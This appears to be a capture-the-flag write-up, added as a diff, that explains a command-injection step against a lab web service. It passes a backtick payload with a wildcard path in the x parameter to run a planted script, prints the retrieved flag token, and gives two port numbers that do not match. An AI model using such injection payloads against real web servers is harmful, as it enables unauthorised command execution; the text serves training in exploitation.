@@ -1,0 +1,14 @@
+The script is executed on a web server at VM_IP:4747.
+It modifies the xx parameter so that the output will be in upercase and remove everything after a whitepace.
+After it a shell command is executed with backsticks.
+We can send a request that executed our script.
+
+$> echo "getflag > /tmp/output" > /tmp/GETFLAG
+
+We can't specify the right path due to string modification but we can use wildcard exploit.
+
+http://VM_IP:4646/?x="`/*/GETFLAG`"
+
+$> cat /tmp/output
+
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
